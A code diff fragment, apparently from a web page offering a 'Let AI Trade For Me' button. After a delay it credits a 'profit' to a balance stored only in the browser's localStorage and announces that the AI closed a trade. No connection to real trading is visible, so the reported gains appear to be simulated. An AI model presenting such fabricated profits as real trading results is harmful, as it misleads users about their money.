+                saveTrades(allTrades);
+
+                var newBal = parseFloat(localStorage.getItem('currentBalance') || 0) + tradeAmount + profit;
+                updateBalanceDisplay(newBal);
+                renderTrades();
+                showStatusMessage('?? AI closed trade. Profit: +$' + profit.toFixed(2) + ' (' + pct.toFixed(2) + '%) added to your balance.');
+
+                btn.disabled = false;
+                btn.innerHTML = '?? Let AI Trade For Me';
             }, closeDelay);
         }
 
